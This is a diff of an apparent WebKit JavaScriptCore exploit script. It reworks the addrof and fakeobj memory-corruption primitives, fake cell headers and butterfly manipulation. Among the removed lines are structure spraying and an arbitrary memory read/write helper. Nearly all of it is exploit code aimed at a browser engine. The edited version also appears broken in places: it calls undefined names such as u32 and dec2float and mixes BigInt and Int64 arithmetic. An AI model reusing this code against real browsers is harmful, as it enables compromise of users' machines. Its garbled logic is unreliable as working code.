@@ -336,27 +336,26 @@ function iv(x){
 // That's all the arithmetic we need for exploiting WebKit.. :)
 
           // constant added to double JSValues
-          const kBoxedDoubleOffset = 0x0002000000000000n;
+          const kBoxedDoubleOffset = new Int64("0x0002000000000000");
           function boxDouble(d) {
-            return d + kBoxedDoubleOffset;
+            return Add(d,kBoxedDoubleOffset);
           }
           function unboxDouble(d) {
-            return d - kBoxedDoubleOffset;
+            return Sub(d,kBoxedDoubleOffset);
           }
           // the structure ID is wrong, but we'll fix it :)
-          let doubleArrayCellHeader = 0x0108230700000000n;
+          let doubleArrayCellHeader = new Int64("0x0108230700000000");
           let f = new Float64Array(1);
           let u = new Uint32Array(f.buffer);
-          function float2bigint(v) {
-            f[0] = v;
-            return BigInt(u[0]) | (BigInt(u[1]) << 32n);
+          function f2dec(floatpoint) {
+                f[0] = floatpoint;
+                return (u32[1]*kBoxedDoubleOffset+u32[0]).toString(16);
           }
-          function bigint2float(v) {
-            u[0] = Number(v & 0xffffffffn);
-            u[1] = Number(v >> 32n);
-            return f[0];
+          function dec2f(dec) {
+                u32[0] = dec%kBoxedDoubleOffset;
+                u32[1] = dec/kBoxedDoubleOffset;
+                return f[0];
           }
-
           // store things to prevent GC
           let keep = [];
           function gc(n=10000) {
@@ -396,7 +395,7 @@ function iv(x){
             b1[0] = kSentinel;
             // scan for the sentinel to find the offset from a to b
             for (var i = 0; i < 0x100; i++) {
-              if (bigint2float(unboxDouble(float2bigint(a1[i]))) == kSentinel) {
+              if (dec2f(unboxDouble(f2dec(a1[i]))) == kSentinel) {
                 offset = i;
                 break;
               }
@@ -409,14 +408,15 @@ function iv(x){
             // temporary implementations
             addrof = (val) => {
               b1[0] = val;
-              return float2bigint(a1[offset]);
+              return f2dec(a1[offset]);
             }
             fakeobj = (addr) => {
-              a1[offset] = addr;
+              a1[offset] = dec2f(addr);
               return b1[0];
             }
+
             let obj = {
-              jsCellHeader: bigint2float(unboxDouble(doubleArrayCellHeader)),
+              jsCellHeader: dec2float(unboxDouble(doubleArrayCellHeader)),
               fakeButterfly: a0
             };
 
@@ -426,154 +426,40 @@ function iv(x){
             let fakeArr = fakeobj(addr + 0x10n);
 
             // subtract off the incref
-            doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
+            doubleArrayCellHeader = f2dec(fakeArr[0]) - 0x1n;
             port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
 
             // fix broken cell header
-            fakeArr[0] = bigint2float(doubleArrayCellHeader);
+            fakeArr[0] = dec2f(doubleArrayCellHeader);
 
             // grab a real butterfly pointer
-            let doubleArrayButterfly = float2bigint(fakeArr[1]);
+            let doubleArrayButterfly = f2dec(fakeArr[1]);
 
             // fix other broken cell header
             obj.fakeButterfly = b0;
-            fakeArr[0] = bigint2float(doubleArrayCellHeader);
+            fakeArr[0] = dec2f(doubleArrayCellHeader);
 
             // fix the broken butterflys and setup cleaner addrof / fakeobj
-            obj.jsCellHeader = bigint2float(unboxDouble(doubleArrayCellHeader));
+            obj.jsCellHeader = dec2f(unboxDouble(doubleArrayCellHeader));
             obj.fakeButterfly = a1;
-            fakeArr[1] = bigint2float(doubleArrayButterfly);
+            fakeArr[1] = dec2f(doubleArrayButterfly);
             obj.fakeButterfly = b1;
-            fakeArr[1] = bigint2float(doubleArrayButterfly);
+            fakeArr[1] = dec2f(doubleArrayButterfly);
 
             fakeobj = (addr) => {
-              a1[0] = bigint2float(addr);
+              a1[0] = dec2f(addr);
               return b1[0];
             }
             addrof = (val) => {
               b1[0] = val;
-              return float2bigint(a1[0]);
+              return f2dec(a1[0]);
             }
-            port.postMessage("addrof and fakeobj done");
+
+          
 var print = (msg) => {
     port.postMessage(msg);
 }
-            // from saelo: spray structures to be able to predict their IDs.
-    // from Auxy: I am not sure about why spraying. i change the code to:
-    //
-     var structs = []
-     var i = 0;
-     var abc = [13.37];
-     abc.pointer = 1234;
-     abc['prop' + i] = 13.37;
-     structs.push(abc);
-     var victim = structs[0];
-    //
-    // and the payload still work stablely. It seems this action is redundant
-    /*var structs = []
-    for (var i = 0; i < 0x1000; ++i) {
-        var array = [13.37];
-        array.pointer = 1234;
-        array['prop' + i] = 13.37;
-        structs.push(array);
-    }*/
-
-    // take an array from somewhere in the middle so it is preceeded by non-null bytes which
-    // will later be treated as the butterfly length.
-    //var victim = structs[0x800];
-    print("[+] victim @"+addrof(victim));
-
-    // craft a fake object to modify victim
-    var flags_double_array = new Int64("0x0108200700001000").asJSValue();
-    var container = {
-        header: flags_double_array,
-        butterfly: victim
-    };
-
-    // create object having |victim| as butterfly.
-    var containerAddr = addrof(container);
-    print("[+] container @"+containerAddr);
-    // add the offset to let compiler recognize fake structure
-    /*var hax = fakeobj(Add(containerAddr,new Int64("0x10")));
-    print("got hax obj we now have slighty arb r/w")
-    // origButterfly is now based on the offset of **victim** 
-    // because it becomes the new butterfly pointer
-    // and hax[1] === victim.pointer
-    var origButterfly = hax[1];
-*/
-   /* var memory = {
-        addrof: addrof,
-        fakeobj: fakeobj,
-
-        // Write an int64 to the given address.
-        writeInt64(addr, int64) {
-            hax[1] = Add(new Int64(addr),0x10);
-            victim.pointer = new Int64(int64);
-        },
-
-        // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
-        write16(addr, value) {
-            // Set butterfly of victim object and dereference.
-            hax[1] = Add(new Int64(addr), 0x10).asDouble();
-            victim.pointer = value;
-        },
-
-        // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
-        write(addr, data) {
-            while (data.length % 4 != 0)
-                data.push(0);
-
-            var bytes = new Uint8Array(data);
-            var ints = new Uint16Array(bytes.buffer);
-
-            for (var i = 0; i < ints.length; i++)
-                this.write16(Add(addr, 2 * i), ints[i]);
-        },/
-
-        // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
-        read64(addr) {
-            // Set butterfly of victim object and dereference.
-            hax[1] = Add(new Int64(addr), 0x10).asDouble();
-            return this.addrof(victim.pointer);
-        },
-        read16(addr) {
-            hax[1] = Add(addr,0x10).asDouble();
-            return victim.pointer;
-        },
-        read: function(addrObj, length) {
-                //var offset = 0;
-                //var writer = this.create_writer(addrObj);
-                var arr = new Uint8Array(length);
-                for (var i = 0; i < length; i++) {
-                    arr[i] = this.read16(addrObj + i);
-                }
-                return arr;
-            },
-
-        //Verify that memory read and write primitives work.
-        test() {
-            var v = {};
-            var obj = {p: v};
-
-            var addr = this.addrof(obj);
-            assert(this.fakeobj(addr).p == v, "addrof and/or fakeobj does not work");
-
-            var propertyAddr = Add(addr, 0x10);
-
-            var value = this.read64(propertyAddr);
-            assert(value.asDouble() == addrof(v).asDouble(), "read64 does not work");
-
-            this.write16(propertyAddr, 0x1337);
-            assert(obj.p == 0x1337, "write16 does not work");
-        },
-    };
-
-    // Testing code, not related to exploit
-    var plainObj = {};
-    var header = memory.read16(addrof(plainObj));
-    memory.writeInt64(memory.addrof(container), header);
-    //memory.test();
-    print("[+] limited memory read/write working");*/
+            
           }
 
           function pwn() {
